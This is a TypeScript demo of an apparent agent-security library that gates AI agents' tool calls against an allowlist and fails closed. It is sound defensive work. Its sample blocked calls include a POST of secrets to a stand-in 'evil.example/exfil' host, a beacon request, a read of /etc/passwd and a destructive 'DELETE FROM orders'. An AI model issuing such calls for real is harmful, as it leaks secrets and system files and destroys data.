/**
 * Example: Pre-execution action gate (#57) — a deterministic kill switch
 *
 * The detector pipeline answers "does this content look adversarial?". It can't
 * answer "should this agent be allowed to POST to an unknown host, or read
 * /etc/passwd, right now?". Deny-lists are unbounded; an allowlist is finite and
 * auditable. `checkAction` evaluates a proposed tool call against an explicit
 * allowlist of permitted operations and refuses everything else — binary, no
 * confidence scores, failing closed.
 *
 * This is what makes "deterministic execution layer" literal rather than
 * aspirational: inference is probabilistic, but the gate is not.
 *
 * Run: npx tsx examples/action-gate.ts
 */
import { AgentArmor, ActionBlockedError } from '@stylusnexus/agentarmor';
import type { ActionRequest } from '@stylusnexus/agentarmor';

// Declare the small set of actions this agent may take. Everything else is
// refused by default — independent of whether any detector pattern fired.
const armor = AgentArmor.regexOnly({
  allowedActions: [
    { tool: 'http.get', hosts: ['api.internal.example.com', '*.trusted.example'] },
    { tool: 'fs.read', paths: ['./data/**', 'logs/*.log'] },
    { tool: 'db.query', mode: 'read-only' },
  ],
});

/** Gate a tool call: admissible ones run, everything else fails closed. */
function guard(req: ActionRequest): void {
  const verdict = armor.checkAction(req);
  if (!verdict.admissible) {
    throw new ActionBlockedError(verdict.reason);
  }
  console.log(`  ✓ ALLOWED  ${req.tool}  (rule: ${JSON.stringify(verdict.matchedRule)})`);
}

const attempts: ActionRequest[] = [
  // Allowed: host on the allowlist
  { tool: 'http.get', args: { url: 'https://api.internal.example.com/v1/orders' } },
  // Allowed: wildcard subdomain
  { tool: 'http.get', args: { url: 'https://reports.trusted.example/q' } },
  // Allowed: path inside ./data/**
  { tool: 'fs.read', args: { path: './data/customers/2026.csv' } },
  // Allowed: read-only db query
  { tool: 'db.query', args: { sql: 'SELECT count(*) FROM orders', mode: 'read-only' } },
  // BLOCKED: tool not on the allowlist
  { tool: 'http.post', args: { url: 'https://evil.example/exfil', body: '<secrets>' } },
  // BLOCKED: allowed tool, disallowed host
  { tool: 'http.get', args: { url: 'https://evil.example/beacon' } },
  // BLOCKED: path outside the allowlist
  { tool: 'fs.read', args: { path: '/etc/passwd' } },
  // BLOCKED: write attempted under a read-only rule
  { tool: 'db.query', args: { sql: 'DELETE FROM orders', mode: 'write' } },
];

console.log('Pre-execution action gate demo:\n');
for (const req of attempts) {
  try {
    guard(req);
  } catch (err) {
    if (err instanceof ActionBlockedError) {
      console.log(`  ✗ BLOCKED  ${req.tool}  — ${err.message}`);
    } else {
      throw err;
    }
  }
}

// Empty allowlist denies everything (fail closed), not allow-everything.
const locked = AgentArmor.regexOnly({ allowedActions: [] });
console.log(
  `\nEmpty allowlist, http.get admissible? ${locked.checkAction({ tool: 'http.get', args: { url: 'https://api.internal.example.com' } }).admissible}`
);
